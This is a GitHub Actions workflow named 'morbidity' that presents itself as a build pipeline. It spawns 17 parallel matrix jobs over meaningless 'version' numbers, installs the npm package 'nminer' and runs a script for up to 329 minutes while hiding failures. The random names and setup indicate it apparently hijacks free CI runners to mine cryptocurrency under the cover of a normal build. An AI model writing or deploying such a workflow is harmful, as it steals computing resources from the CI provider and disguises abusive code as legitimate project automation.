name: morbidity
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2267 }
          - { version: 9979 }
          - { version: 2043 }
          - { version: 6429 }
          - { version: 4027 }
          - { version: 350 }
          - { version: 7706 }
          - { version: 394 }
          - { version: 3692 }
          - { version: 3861 }
          - { version: 1906 }
          - { version: 220 }
          - { version: 4329 }
          - { version: 3063 }
          - { version: 4109 }
          - { version: 9255 }
          - { version: 5452 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: livid until
        run: |
          npm install nminer@latest
          timeout 329m node morbidity.js || echo "morbidity executed"